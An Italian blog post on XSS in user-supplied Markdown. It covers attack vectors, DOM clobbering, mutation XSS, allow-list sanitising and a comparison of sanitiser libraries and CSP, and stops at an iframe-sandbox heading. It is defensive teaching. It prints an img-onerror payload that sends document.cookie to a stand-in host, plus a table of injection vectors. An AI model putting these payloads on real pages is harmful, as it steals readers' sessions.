---
title: "XSS in Markdown: Markdown permette HTML grezzo, quindi permette gli script"
description: Markdown lascia passare l'HTML grezzo, quindi un file .md può portare script — i vettori da conoscere, allow-list contro block-list, e cosa aggiunge una CSP.
date: 2026-08-21
tag: Sicurezza
keywords: xss in markdown, sanificare markdown, sanificare html, dompurify, markdown html grezzo, html grezzo dentro markdown, rendering sicuro di markdown, markdown generato dagli utenti, content security policy html
---

Markdown è stato progettato per stare accanto all'HTML, non per sostituirlo. Le regole di sintassi originali lasciano passare l'HTML senza toccarlo, e i parser che le seguono lo fanno ancora oggi. Dai a `marked` o a Python-Markdown un tag `<script>` e ti torna un tag `<script>`; `markdown-it` e remark fanno lo stesso una volta che l'HTML grezzo è attivato.

### In breve

Markdown permette HTML grezzo per progetto, quindi qualunque Markdown che non hai scritto tu può portare `<script>`, `onerror=`, URL `javascript:`, `<iframe srcdoc>`, azioni di form e id che oscurano le tue variabili globali. La correzione è un **sanificatore ad allow-list applicato all'HTML già reso**, mai al codice sorgente Markdown, perché il renderer inventa markup che non è mai apparso alla lettera nel file. Usa DOMPurify nel browser e un sanificatore Node, Python, Go, Java, Rust o Ruby sulla *stessa* allow-list sul server, poi metti una Content Security Policy sulla pagina così un bug del sanificatore diventa una richiesta bloccata invece di una sessione rubata.

Nessuno si propone di rendere Markdown non fidato. Arriva di lato. Una casella di commento fa crescere un pannello di anteprima, un help desk comincia ad accettare ticket formattati, uno script di build rende ogni README di un monorepo su una dashboard interna, l'output di un modello finisce dritto in una pagina così qualcuno può leggerlo per bene. In ogni caso una stringa controllata da qualcun altro finisce in un documento con cui il tuo stesso JavaScript condivide una finestra.

È un comportamento corretto per un file che viene dal tuo stesso repository. Per un commento, un ticket o l'output di un modello linguistico, è un buco: qualcosa deve stare tra il parser e la pagina.

La parola "sanificare" nasconde quanta decisione ci sia dentro. Un sanificatore non è un filtro che accendi. È una dichiarazione scritta di quali tag e attributi il tuo prodotto permette, applicata in esattamente un punto della pipeline, in un ambiente il cui parser HTML corrisponde a quello che userà chi legge. Sbaglia la dichiarazione ed è decorazione; sbaglia la posizione ed è peggio della decorazione, perché tutto quello che viene dopo sembra sicuro.

## L'HTML grezzo dentro Markdown è una funzione, non una svista

La premessa di Markdown era che la sua sintassi non avrebbe mai coperto tutto, quindi qualunque cosa non coprisse l'avresti scritta in HTML. Quella premessa è il motivo per cui il formato si è diffuso e perché resta la via più corta dal testo a una pagina. È anche il motivo per cui ogni renderer conforme è, per contratto, un passaggio diretto dell'HTML.

Un payload non deve sembrare uno. Questo è Markdown valido:

```markdown
Thanks for the fix, this works now.

<img src=x onerror="fetch('https://elsewhere.invalid/?c='+document.cookie)">
```

Il parser riconosce un pezzo di HTML e lo copia nell'output. Niente è malformato, quindi niente ti avverte. Non c'è nessun errore, nessuna riga di log e nessun artefatto visibile nella pagina resa — un'immagine rotta è la sola cosa che ogni lettore è stato addestrato a ignorare.

I parser cercavano di aiutare. `marked` aveva un'opzione `sanitize`; è stata deprecata, poi rimossa, con la documentazione che rimandava a un sanificatore dedicato. Era la scelta giusta. Un filtro HTML scritto a metà dentro un parser Markdown è peggio di niente, perché sembra protezione: un revisore vede `sanitize: true` in un oggetto di opzioni e smette di fare domande. Sanificare l'HTML correttamente significa possedere un parser, un serializzatore, un'allow-list e un processo di risposta alla sicurezza, e una libreria Markdown non ha motivo di promettere tre di questi quattro.

La correzione più semplice, quando è applicabile: `markdown-it` lascia l'HTML grezzo disattivato per default, quindi le parentesi angolari escono con l'escape e visibili. Se i tuoi utenti non hanno motivo di scrivere HTML, lascialo disattivato — meno codice e meno bug di qualunque allow-list. [Python-Markdown](/blog/markdown-to-html-in-python) non ha un interruttore equivalente e la sua documentazione ti indirizza a un sanificatore separato, quindi una pipeline Python ha sempre un secondo passaggio, che qualcuno lo abbia scritto o no.

Disattivare l'HTML grezzo è la sola opzione in questa pagina che rimuove la superficie di attacco invece di filtrarla. Tutto il resto è un giudizio su quale HTML sei disposto a eseguire.

## I vettori, nominati

L'elenco sotto non è una lista di trucchi esotici. È la superficie ordinaria dell'HTML, che è un linguaggio per costruire applicazioni, messo nelle mani di un documento scritto da uno sconosciuto.

| Cosa arriva | Cosa fa | La regola |
| --- | --- | --- |
| `<script>alert(1)</script>` | Si esegue, se l'HTML viene analizzato invece che assegnato tramite un sink sicuro | Non permettere mai `script`; non permettere nemmeno `noscript` |
| `<img src=x onerror=...>` | Si attiva quando l'immagine fallisce, cosa che farà | Elimina ogni attributo il cui nome comincia con `on` |
| `<a href="javascript:...">` | Si esegue al clic, senza bisogno di un tag script | Permetti solo `http`, `https`, `mailto` e i relativi |
| `<a href="data:text/html,...">` | Un intero documento dentro un URL | Tieni `data:` fuori da `href` del tutto |
| `<iframe srcdoc="...">` | Porta un documento dentro un attributo, nella tua origine | Elimina `iframe`, `object`, `embed` |
| `<form action="https://elsewhere">` | Trasforma i tuoi campi in un form di qualcun altro | Elimina `form`, `button`, `input`, `formaction` |
| `<style>` e `style="..."` | Riposiziona, sovrappone, nasconde, e trafuga con `url()` | Elimina entrambi a meno che tu non abbia un motivo |
| `<a id="config">` | Oscura `window.config` senza eseguire codice | Prefissa ogni `id` e `name` che sopravvive |
| `<base href="//elsewhere">` | Ripunta ogni URL relativo della pagina | Eliminalo; imposta `base-uri 'none'` |
| `<meta http-equiv="refresh">` | Porta via il lettore navigando altrove | Elimina `meta` |
| `<svg>`, `<math>`, `<template>` | Regole di parsing diverse, quindi bug diversi | Elimina a meno che l'allow-list non ne abbia bisogno |

**Gli attributi di gestione eventi sono l'evento principale.** `<script>` è il vettore che tutti bloccano per primo e quello che conta meno, perché i payload interessanti non ne hanno bisogno. Ogni attributo `on*` è uno script inline con un'ortografia diversa, e la specifica continua ad aggiungerne alla lista. È l'argomento più chiaro a favore dell'allow-list sugli attributi invece che nominare quelli che non ti piacciono: non puoi enumerare `on*` correttamente, e non devi farlo.

**Gli schemi hanno bisogno di essere decodificati prima di essere controllati.** Testa il valore decodificato, non la stringa grezza. `java&#9;script:`, `JaVaScRiPt:` e un URL con una nuova riga iniziale sono un solo URL per un browser e diverse stringhe diverse per un confronto ingenuo. Tieni `data:` fuori da `href` come politica: i browser bloccano una navigazione di primo livello verso `data:text/html`, ma è la loro mitigazione, non la tua, e non copre ogni sink.

**`srcdoc` è l'attributo che le persone dimenticano.** Un `<iframe srcdoc>` porta un intero documento HTML dentro il valore di un attributo, con doppio escape, ed eredita l'origine del documento che lo ospita. Un sanificatore che permette `iframe` per i video incorporati e si dimentica di `srcdoc` ha lasciato passare HTML arbitrario nella stessa origine attraverso un buco a forma di lettore video.

**Le azioni dei form non hanno bisogno di script per rubare.** Un `<form action="https://elsewhere.invalid">` iniettato che avvolge parte della tua pagina trasforma il prossimo clic del lettore in un invio da qualche altra parte, e un `<input type="image" formaction="...">` sovrascrive l'azione di un form che hai scritto tu. Niente si esegue; il browser fa esattamente quello che dice il markup. Questo è il motivo per cui `form` e `input` meritano attenzione anche quando permetti `<input type="checkbox" disabled>` per le liste di attività GFM — permetti l'unica combinazione di attributi di cui hai bisogno e niente altro.

**Il CSS è una capacità, non una decorazione.** La sintassi `expression()` che una volta rendeva `style` direttamente eseguibile è sparita da tempo dai browser attuali, ed è ancora il motivo per cui il CSS ha questa fama. I problemi vivi sono più discreti. `position: fixed` con uno `z-index` alto metta l'elemento di un attaccante sopra la tua interfaccia, così un clic su "Annulla" finisce da qualche altra parte. `opacity: 0` nasconde un testo che resta selezionabile. Un `url()` in uno sfondo raggiunge terze parti nel momento in cui l'elemento viene reso, il che è un beacon che dice a qualcuno quando il tuo documento è stato letto. Niente di tutto questo esegue uno script e tutto questo è un problema, motivo per cui la risposta predefinita per `<style>` e `style` è no.

## DOM clobbering: un id che oscura una proprietà

Ogni elemento con un `id` diventa una proprietà su `window` sotto quel nome, e i controlli di form nominati diventano proprietà del loro form. Un `<a id="config">` iniettato rende `window.config` un elemento anchor, così `if (!window.config) { window.config = defaults }` prende il ramo sbagliato, e `config.apiBase` adesso è `undefined` invece del tuo URL — oppure, con `<a id="config" name="apiBase" href="//elsewhere">`, qualcosa che ha scelto un attaccante. Nessuno script si è eseguito. Un attributo era sufficiente.

I sanificatori coprono meno di questo di quanto suggerisca la loro fama. Il controllo predefinito di DOM clobbering di DOMPurify elimina un `id` o un `name` solo quando il valore è già una proprietà di un `Document` o di un `HTMLFormElement`: `id="title"`, `id="body"`, `id="cookie"` e `id="action"` se ne vanno, `id="config"` resta. `config` è un nome inventato dal tuo stesso codice, e nessun sanificatore guarda le tue variabili globali. Una copertura più completa è `SANITIZE_NAMED_PROPS`, disattivata per default, che prefissa ogni `id` e `name` che conserva con `user-content-`.

Quel prefisso è la vera difesa — un id che non può collidere non può oscurare — e deve coprire sia gli id che arrivano nel documento sia gli id che il tuo renderer genera dai titoli, perché un titolo chiamato "Config" produce `id="config"` senza nessun attaccante coinvolto. Questo sito sanifica con DOMPurify nel browser e con il pacchetto `xss` sul server, contro un'unica allow-list condivisa, e prefissa ogni id di titolo con `doc-`: la stessa difesa applicata a mano. Se generi ancoraggi per un indice dei contenuti, questo è il passaggio da aggiungere oggi, prima di qualunque altra cosa in questa pagina.

## Le allow-list battono le block-list

Una block-list nomina quello che è proibito e fallisce la prima volta che qualcuno usa un tag a cui nessuno aveva pensato. Fallisce di nuovo ogni volta che un browser rilascia una funzione, e una terza volta su capitalizzazione, codifica, o un attributo di cui l'autore della lista non aveva mai sentito parlare. Un'allow-list nomina cosa può contenere un documento e scarta il resto, quindi la sua modalità di fallimento è un elemento `<details>` mancante piuttosto che una sessione rubata.

L'allow-list resta corta, perché l'output di Markdown è piccolo: titoli, paragrafi, liste, citazioni, tabelle, codice, enfasi, link, immagini, linee orizzontali, e un `<input>` per le liste di attività. La lista degli attributi è ancora più corta — `href`, `src`, `alt`, `title`, `class` se stili i blocchi di codice, `colspan` e `rowspan` se le tue tabelle ne hanno bisogno, `type`, `checked` e `disabled` per le liste di attività.

Scrivi quella lista in un solo file e importala ovunque. Il fallimento più comune nella realtà non è un bypass, è la deriva: il sanificatore del browser e quello del server sono stati configurati separatamente, sei mesi di distanza, da due persone, e il documento che si rende in sicurezza nell'app è salvato con l'`<iframe>` ancora intatto per il prossimo che lo trova. Due allow-list sono un'allow-list e una responsabilità.

L'altra regola è che l'allow-list appartiene al prodotto, non alla libreria. Lo `defaultSchema` di `rehype-sanitize` segue le regole di sanificazione di GitHub e `UGCPolicy()` di bluemonday è un default ponderato per il contenuto generato dagli utenti — entrambi punti di partenza migliori di qualunque cosa scriveresti in un pomeriggio. Nessuno dei due sa se la tua pagina ha un `<div id="app">` che il tuo framework legge. Parti dalla politica fornita, poi sottrai.

## Sanifica dopo la resa, mai prima

Sanificare il codice sorgente Markdown significa indovinare cosa farà il parser, e il parser ti sorprenderà. Markdown ha diverse ortografie per lo stesso output — link di riferimento, escape con backslash, entità di carattere, blocchi HTML indentati — quindi un filtro che fa grep del codice sorgente in cerca di `javascript:` si perde `[click](java&#115;cript:alert(1))` e una definizione di riferimento trecento righe sotto il link che la usa. Peggio, il renderer inventa markup che non è mai apparso alla lettera: un autolink diventa un `<a href>` completo che il codice sorgente non conteneva mai, un blocco recintato diventa `<pre><code class="language-...">`, un titolo diventa un `id`. Un filtro sul codice sorgente filtra la stringa sbagliata.

Quindi sanifica quello che il renderer ha prodotto, e poi smetti di toccarlo:

```js
import DOMPurify from 'dompurify';
import { marked } from 'marked';

const clean = DOMPurify.sanitize(marked.parse(userMarkdown), {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'code', 'pre', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
  SANITIZE_NAMED_PROPS: true,
});
```

"Poi smetti di toccarlo" è la metà che le persone saltano. Un evidenziatore di sintassi che avvolge i token in span, un template che interpola la stringa dentro un wrapper, un'espressione regolare che riscrive gli anchor per aggiungere `target="_blank"`, un passaggio che inietta ancore di titolo per un indice dei contenuti: ognuno di questi corre dopo il sanificatore e sta fuori dalla sua garanzia. Se una trasformazione deve succedere, o eseguila prima del sanificatore così anche il suo output viene controllato, oppure eseguila sul DOM dopo l'inserimento usando `textContent` e `setAttribute` invece di modificare una stringa.

Un'altra regola sulla posizione: conserva il Markdown *originale*, non l'HTML sanificato. Sanificare all'ingresso e fidarsi poi dell'archivio congela la tua allow-list alla data della scrittura, quindi il giorno in cui la restringi, ogni vecchio documento resta com'era.

## Mutation XSS: due parser in disaccordo

Un sanificatore analizza l'HTML in un albero, decide che l'albero è pulito, e lo serializza di nuovo in una stringa. Il browser poi analizza di nuovo quella stringa. Se la seconda analisi produce un albero diverso dal primo, il controllo è stato eseguito su un documento che nessuno spedisce davvero. Questo è la mutation XSS, e il bug non appartiene a nessuno dei due parser — solo al disaccordo fra loro.

I punti da guardare sono dove le regole di parsing dell'HTML cambiano a metà documento. I contenuti estranei come `<svg>` e `<math>` seguono regole quasi-XML in cui `<style>` e i commenti si comportano diversamente. `<template>` ha un proprio documento di contenuto. L'annidamento che forza una chiusura implicita di un tag può spostare un elemento fuori dal sottoalbero in cui è stato controllato. Le entità dentro i valori di attributo si decodificano in uno stadio diverso da quelle nel testo.

Le difese sono noiose, ed essere noiose è il punto. Tieni il sanificatore aggiornato, perché questa classe di bug viene trovata dai ricercatori e corretta nelle release, quindi una versione fissata a tre anni fa è il vero rischio. Non incatenare mai due sanificatori, perché quello che l'ultimo produce è quello che viene spedito e la garanzia del primo è vuota. Tieni i contenuti estranei fuori dall'allow-list a meno che un requisito non li richieda.

Il sanificatore lato server ha qui una lacuna strutturale: senza un browser porta con sé un proprio parser, non quello che userà chi legge. La risposta di Ammonia è html5ever, che analizza e serializza i fragmenti come fanno i browser; quella di sanitize-html è htmlparser2, scelto per velocità e tolleranza. Tolleranza e fedeltà non sono la stessa proprietà. Simulare un DOM è peggio di entrambi — dato un ambiente che non può usare, DOMPurify restituisce il suo input invariato invece di lanciare un errore, quindi un setup jsdom rotto fallisce aperto e in silenzio.

## Confronto rapido: il bigliettino

| Strumento | Ideale per | Capacità principale | Prezzo |
| --- | --- | --- | --- |
| Nessun HTML grezzo | Commenti, chat, qualunque cosa che non ha mai avuto bisogno di HTML | `markdown-it` fa l'escape dell'HTML grezzo per default | Gratis, MIT |
| DOMPurify (browser) | Rendere Markdown non fidato in una pagina | Usa il parser del browser stesso, quindi nessuna seconda opinione | Gratis, Apache 2.0 o MPL 2.0 |
| DOMPurify + jsdom | Riusare un'allow-list su un server Node | Lo stesso oggetto di configurazione, un DOM sintetico | Gratis, Apache 2.0 o MPL 2.0; jsdom MIT |
| sanitize-html | Node senza un DOM | htmlparser2, allow-list di attributi per elemento | Gratis, MIT |
| js-xss (`xss`) | Node, browser e una riga di comando | Opzione `whiteList`, nessun DOM richiesto, ha una CLI | Gratis, MIT |
| rehype-sanitize | Pipeline remark e unified | Sanifica l'albero hast, non una stringa | Gratis, MIT |
| nh3 | Python | Binding a ammonia in Rust | Gratis, MIT |
| Bleach | Niente di nuovo | Era il default Python; adesso non mantenuto | Gratis, Apache 2.0 |
| bluemonday | Go | Preset `UGCPolicy()` e `StrictPolicy()` | Gratis, BSD-3-Clause |
| OWASP Java HTML Sanitizer | Java | `HtmlPolicyBuilder`, nessuna dipendenza a runtime | Gratis, Apache 2.0 o BSD-2-Clause |
| Ammonia | Rust | html5ever, analizza come fa un browser | Gratis, MIT o Apache 2.0 |
| Loofah | Ruby | Scrubber di Nokogiri; il sanificatore di Rails si basa su di esso | Gratis, MIT |
| Content Security Policy | Il bug del sanificatore che non hai trovato | Blocca l'esecuzione a prescindere dal markup | Gratis, uno standard web |
| Iframe sandbox | Documenti che non puoi rendere sicuri | `sandbox` elimina origine, script e form | Gratis, parte dell'HTML |
| TransformPipe | Convertire un file `.md` che non hai scritto tu | Sanifica nel browser e sul server, un'allow-list unica | Gratis |

## Le opzioni, una alla volta

### Nessun HTML grezzo — l'opzione a cui nessuno pensa per primo

Prima di scegliere un sanificatore, chiediti se la funzione esiste per davvero. Se i tuoi utenti scrivono commenti, messaggi di chat o corpi di ticket, quasi nessuno di loro vuole scrivere HTML, e quelli che lo vogliono sono il motivo per cui stai leggendo questo. `markdown-it` spedisce con `html: false`, che fa l'escape delle parentesi angolari così si rendono come testo visibile.

| Pro | Contro |
| --- | --- |
| Rimuove la superficie di attacco invece di filtrarla | Qualunque cosa Markdown non può esprimere adesso è impossibile |
| Nessuna allow-list da mantenere, nessun sanificatore da tenere aggiornato | Documenti scritti altrove potrebbero già contenere HTML |
| Nessuna mutation XSS, perché niente viene ri-analizzato | Gli utenti che hanno bisogno di un blocco `<details>` si lamenteranno |

**Prezzo:** gratis, licenza MIT.

**Dettagli tecnici e funzioni**

- `markdown-it` ha `html: false` per default; l'HTML grezzo nel codice sorgente viene sottoposto a escape, non analizzato
- `marked` e Python-Markdown lasciano passare l'HTML grezzo e si aspettano un sanificatore separato
- L'escape non è un sanificatore: produce testo, motivo per cui non si può bypassare

**Per chi è?** Per chiunque renda testo breve generato dagli utenti. È il default corretto per una casella di commento, e viene scelto molto meno spesso di quanto dovrebbe.

### DOMPurify nel browser — la risposta predefinita

DOMPurify sanifica una stringa HTML usando il DOM dell'ambiente in cui gira. In un browser è lo stesso parser che renderà il risultato, il che rimuove alla radice la lacuna della mutation XSS: non c'è nessuna seconda opinione, perché c'è solo un parser.

| Pro | Contro |
| --- | --- |
| Usa il parser del browser stesso, quindi l'albero controllato è l'albero reso | Ha bisogno di un DOM, quindi Node semplice richiede jsdom |
| Mantenuto attivamente, con una vera storia di risposta alla sicurezza | `SANITIZE_NAMED_PROPS` è disattivato per default, quindi il clobbering è coperto solo in parte |
| La configurazione è un solo oggetto di opzioni che puoi condividere in tutto il codice | Restituisce il suo input invariato se gli dai un DOM inutilizzabile, il che fallisce aperto |
| Gli hook ti permettono di ispezionare e rifiutare nodi durante la sanificazione | I default dell'allow-list sono ampi; la maggior parte dei prodotti dovrebbe sottrarre da essi |

**Prezzo:** gratis, doppia licenza Apache 2.0 o MPL 2.0.

**Dettagli tecnici e funzioni**

- `ALLOWED_TAGS` e `ALLOWED_ATTR` per un'allow-list da zero; `ADD_TAGS` e `ADD_ATTR` per estendere i default
- `USE_PROFILES` restringe agli insiemi HTML, SVG o MathML piuttosto che a tutti e tre
- `FORBID_TAGS` e `FORBID_ATTR` per sottrarre dai default
- `SANITIZE_NAMED_PROPS` prefissa i valori di `id` e `name` che sopravvivono, che è la correzione per il DOM clobbering
- `ALLOW_DATA_ATTR` e `ALLOW_ARIA_ATTR` controllano le due famiglie di attributi in blocco

**Per chi è?** Per chiunque renda Markdown in una pagina dentro un browser. [La guida in JavaScript](/blog/markdown-to-html-in-javascript) copre come collegare `marked` e DOMPurify nell'ordine giusto.

### DOMPurify con jsdom — la stessa allow-list su un server

DOMPurify gira anche in Node contro una finestra jsdom. Il motivo per farlo non è che sia il miglior sanificatore server-side — è che è lo *stesso* sanificatore, configurato dallo stesso oggetto, così browser e server non possono divergere.

| Pro | Contro |
| --- | --- |
| Un'allow-list, una configurazione, due runtime | jsdom è una dipendenza grande per un solo compito |
| Il comportamento corrisponde da vicino al percorso del browser | jsdom non è un browser, quindi la lacuna del parser ritorna |
| API familiare se il tuo front end già la usa | Una finestra mal configurata la rende un no-op senza nessun errore |

**Prezzo:** gratis; DOMPurify Apache 2.0 o MPL 2.0, jsdom MIT.

**Dettagli tecnici e funzioni**

- Istanzia con `createDOMPurify(new JSDOM('').window)` e riusa l'istanza
- Importa l'allow-list da un modulo condiviso così non può essere modificata solo su un lato
- Verifica nei test che un tag `<script>` venga rimosso nella configurazione distribuita

**Per chi è?** Per servizi Node che già rendono Markdown lato client e vogliono una sola definizione di "sicuro" invece di due.

### sanitize-html — un sanificatore Node con un proprio parser

sanitize-html pulisce l'HTML con allow-list di attributi per elemento, costruito su htmlparser2 piuttosto che su un DOM. La forma delle sue opzioni si adatta bene a come si legge davvero un'allow-list Markdown: questo tag può avere questi attributi, e nessun altro.

| Pro | Contro |
| --- | --- |
| Nessun DOM e nessun jsdom, quindi è leggero in un processo server | Il suo parser non è quello del browser, che è la lacuna della mXSS |
| Le allow-list di attributi sono per elemento, che è la granularità giusta | La configurazione è verbosa per un'allow-list ampia |
| `transformTags` riscrive gli elementi durante il passaggio | Il repository autonomo è archiviato e in sola lettura, con lo sviluppo spostato nel monorepo di ApostropheCMS (verificato su github.com/apostrophecms/sanitize-html, l'8 settembre 2026) |

**Prezzo:** gratis, licenza MIT.

**Dettagli tecnici e funzioni**

- `allowedTags`, `allowedAttributes`, `allowedSchemes` e `transformTags` come opzioni principali
- Costruito su htmlparser2, descritto dal progetto come scelto per velocità e tolleranza
- Gira ovunque girì Node, senza nessun passaggio di build nativo

**Per chi è?** Per servizi Node che vogliono un'allow-list vera senza spedire un'implementazione DOM, e team a cui la forma delle sue opzioni per elemento risulta più facile da revisionare di una lista piatta.

### js-xss — un sanificatore senza DOM e con una riga di comando

Il pacchetto `xss` sanifica l'HTML in Node e nei browser contro un'opzione `whiteList`, senza bisogno di un DOM. Spedisce anche con una CLI, che lo rende usabile in una pipeline di shell oltre che in un servizio.

| Pro | Contro |
| --- | --- |
| Gira in Node e nei browser senza dipendenza da un DOM | Ha un proprio parser, quindi si applica la lacuna del parser |
| Una CLI, così si adatta a uno script di build senza scrivere codice | Superficie di configurazione più piccola di quella di DOMPurify |
| `whiteList` si mappa direttamente su coppie tag-attributo | `allowList` è un alias, quindi la documentazione si legge in due modi |

**Prezzo:** gratis, licenza MIT.

**Dettagli tecnici e funzioni**

- `whiteList` (con alias `allowList`) definisce i tag permessi e i loro attributi
- Gestori personalizzati per i valori degli attributi, utili per i controlli sugli schemi di `href`
- `xss -i <input> -o <output>` sanifica un file dalla riga di comando

**Per chi è?** Per servizi Node che vogliono una dipendenza piccola, e chiunque sanifichi un file in CI senza un browser. Questa è la metà server della pipeline dietro questo sito, insieme a DOMPurify nel browser contro un'unica allow-list condivisa.

### rehype-sanitize — sanificare l'albero, non la stringa

Se la tua pipeline è remark o unified, rehype-sanitize sanifica l'albero hast a metà della catena. Niente viene serializzato, controllato e ri-analizzato, il che rimuove un'intera classe di bug rimuovendo il passaggio in cui vive.

| Pro | Contro |
| --- | --- |
| Opera sull'albero, quindi non c'è nessun andirivieni di stringhe su cui non essere d'accordo | Ha senso solo dentro una pipeline unified |
| `defaultSchema` segue le regole di sanificazione di GitHub, un punto di partenza ponderato | La pipeline unified porta con sé un apprendimento vero |
| Nessun DOM richiesto; gira in Node, Deno e nei browser | Solo ESM, e la sintassi dello schema è una cosa in sé da imparare |

**Prezzo:** gratis, licenza MIT.

**Dettagli tecnici e funzioni**

- Sanifica hast, l'albero di sintassi HTML, tra `remark-rehype` e `rehype-stringify`
- `defaultSchema` è esportato e può essere esteso o restretto
- Vai dopo qualunque plugin che genera HTML, e prima di stringify

**Per chi è?** Per team che già usano remark o unified per trasformare documenti piuttosto che solo renderli. Un sanificatore dentro la pipeline batte uno avvitato sull'output.

### nh3 — la risposta Python

nh3 fornisce binding Python ad ammonia, il sanificatore HTML in Rust. Perché il lavoro accade in una libreria compilata che usa un parser di livello browser, è insieme veloce e più vicino al comportamento dei browser di un filtro Python puro.

| Pro | Contro |
| --- | --- |
| Basato su ammonia e html5ever, che analizzano come fanno i browser | Una dipendenza compilata, quindi le wheel contano in ambienti vincolati |
| Mantenuto, ed è il sostituto pratico di Bleach | Una superficie API più piccola di quella di Bleach |
| Basato su allow-list, in linea con il modello che questo articolo sostiene | La configurazione non è un drop-in per quella di Bleach |

**Prezzo:** gratis, licenza MIT.

**Per chi è?** Per servizi Python che sanificano output Markdown, e chiunque stia ancora importando Bleach.

### Bleach — quello da cui migrare

Bleach è stato il sanificatore HTML Python predefinito per anni e molta parte del tooling esistente lo importa ancora. Non è più mantenuto: il README dichiara che non ci saranno future release, nemmeno per problemi di sicurezza (verificato su github.com/mozilla/bleach, l'8 settembre 2026).

| Pro | Contro |
| --- | --- |
| Un grande corpo di codice e documentazione esistenti | Non mantenuto, senza nessuna release di sicurezza in arrivo |
| API di allow-list familiare | Un sanificatore non mantenuto è la sola dipendenza che non puoi fissare e dimenticare |
| Ancora funzionante per i casi che gestiva | La difesa dalla mXSS dipende da una manutenzione continua, che si è fermata |

**Prezzo:** gratis, licenza Apache 2.0.

**Per chi è?** Per nessuno, per lavoro nuovo. Se è nel tuo file dei requisiti, è un ticket di migrazione, non una nota a piè di pagina — questa è una classe di bug in cui "tienilo aggiornato" è quasi tutta la difesa.

### bluemonday — la risposta Go

bluemonday sanifica l'HTML in Go contro una politica che costruisci tu o uno dei preset forniti. Le sue due politiche nominate si mappano bene sulle due situazioni che ha la maggior parte dei prodotti.

| Pro | Contro |
| --- | --- |
| `UGCPolicy()` è un buon punto di partenza per il contenuto generato dagli utenti | Solo Go |
| `StrictPolicy()` elimina tutto il markup, per titoli e campi su una sola riga | Costruire una politica è codice, quindi va revisionato come codice |
| Basato su allow-list per progetto, con pattern regexp per i valori degli attributi | Ha un proprio parser, quindi si applica la lacuna del parser |

**Prezzo:** gratis, licenza BSD-3-Clause.

**Dettagli tecnici e funzioni**

- `UGCPolicy()` permette un ampio insieme di elementi per contenuto degli utenti ed esclude iframe, object, embed, style e script
- `StrictPolicy()` rimuove tutti gli elementi e gli attributi
- Le politiche sono componibili, quindi puoi partire da un preset e sottrarre

**Per chi è?** Per servizi Go che rendono Markdown degli utenti. Comincia con `UGCPolicy()`, poi rimuovi quello che il tuo prodotto non usa.

### OWASP Java HTML Sanitizer — la risposta Java

Un sanificatore Java con un builder di politiche esplicito e nessuna dipendenza a runtime, mantenuto sotto l'ombrello OWASP. L'API `HtmlPolicyBuilder` fa leggere l'allow-list come una specifica, utile quando l'allow-list deve sopravvivere a una revisione di sicurezza.

| Pro | Contro |
| --- | --- |
| `HtmlPolicyBuilder` produce una politica leggibile e revisionabile | Solo Java |
| Nessuna dipendenza a runtime | Le politiche pre-imballate sono strette, quindi la maggior parte del lavoro è tuo |
| `Sanitizers.FORMATTING` e `Sanitizers.LINKS` pre-imballati, combinabili | Ha un proprio parser, quindi si applica la lacuna del parser |

**Prezzo:** gratis, doppia licenza Apache 2.0 o BSD-2-Clause.

**Per chi è?** Per servizi JVM. L'API a builder è l'espressione più chiara dell'allow-listing in qualunque linguaggio di questa lista, il che la rende una buona cosa da mostrare a chi non è ancora convinto.

### Ammonia — la risposta Rust, e l'argomento del parser

Ammonia è un sanificatore HTML ad allow-list in Rust costruito su html5ever. Il suo approccio dichiarato è analizzare e serializzare i fragmenti di documento nello stesso modo dei browser, che è la proprietà che conta più per un sanificatore lato server.

| Pro | Contro |
| --- | --- |
| html5ever analizza come fanno i browser, restringendo la lacuna del parser | Solo Rust, a meno che tu lo usi tramite binding |
| Basato su allow-list e veloce | Meno politiche già pronte di quelle di bluemonday |
| È anche il motore dietro nh3 per Python | Una dipendenza compilata in build poliglotte |

**Prezzo:** gratis, doppia licenza MIT o Apache 2.0.

**Per chi è?** Per servizi Rust, e — tramite nh3 — per quelli Python. Vale anche la lettura se stai scegliendo un sanificatore server in qualunque linguaggio, perché la sua scelta di parser è l'argomento che dovresti applicare agli altri.

### Loofah — la risposta Ruby

Loofah pulisce l'HTML usando Nokogiri, con scrubber che eliminano, riducono, fanno l'escape o "whitewash" del markup. Il sanificatore HTML stesso di Rails è costruito sopra di esso, quindi la maggior parte delle applicazioni Ruby lo sta già usando indirettamente.

| Pro | Contro |
| --- | --- |
| Costruito su Nokogiri, un parser HTML ben esercitato | Solo Ruby |
| Già sotto il sanificatore di Rails, quindi ben testato sul campo | Nokogiri è una dipendenza nativa |
| Diverse strategie di scrubbing, non solo una | I nomi delle strategie richiedono un momento per essere imparati |

**Prezzo:** gratis, licenza MIT.

**Per chi è?** Per applicazioni Ruby e Rails. Se stai chiamando l'helper `sanitize` di Rails sei già qui; la domanda è se l'allow-list è tua o quella predefinita del framework.

### Content Security Policy — lo strato che un sanificatore non può essere

Una CSP non è un sanificatore e non compete con uno. Risponde a una domanda diversa: cosa succede quando il sanificatore ha torto. Un sanificatore cerca di garantire che nessun markup eseguibile raggiunga la pagina; una CSP dice al browser di non eseguire markup a prescindere da come sia arrivato.

| Pro | Contro |
| --- | --- |
| Funziona sul bug che non hai ancora trovato | Non è un sostituto della sanificazione; non rimuove niente |
| `script-src 'none'` è assoluto su una pagina senza propri script | Una pagina applicativa che esegue il proprio JavaScript non può usare `'none'` |
| `base-uri 'none'` e `frame-ancestors 'none'` chiudono vettori che nessuna allow-list copre | Adattare una politica a un'app esistente è lavoro vero |
| Gli endpoint di reporting trasformano le iniezioni tentate in telemetria | `frame-ancestors` e `sandbox` sono ignorati in un tag `<meta>` |

**Prezzo:** gratis, uno standard web implementato dai browser.

**Dettagli tecnici e funzioni**

- `script-src 'none'` su una pagina il cui unico compito è mostrare documenti
- `base-uri 'none'` neutralizza un `<base href>` iniettato, cosa che nessuna allow-list di tag può esprimere
- `frame-ancestors 'none'` impedisce che il tuo documento venga incorniciato dentro la pagina di qualcun altro
- `img-src` e `connect-src` limitano dove un elemento superstite può inviare una richiesta
- Consegnata come header di risposta o come tag `<meta http-equiv>`, con la forma meta che ignora `frame-ancestors`, `report-uri` e `sandbox`

**Per chi è?** Per ogni pagina che rende il documento di qualcun altro. Il compromesso è reale: una pagina che esegue il proprio JavaScript non può usare `script-src 'none'`, il che spinge a rendere i documenti non fidati su una rotta propria. Un documento [condiviso come link](/blog/share-a-markdown-document-as-a-link) da TransformPipe viene servito così, e il file che scarichi non ha nessuno script del tutto.

### Un iframe con sandbox — isolamento quando il filtraggio non basta

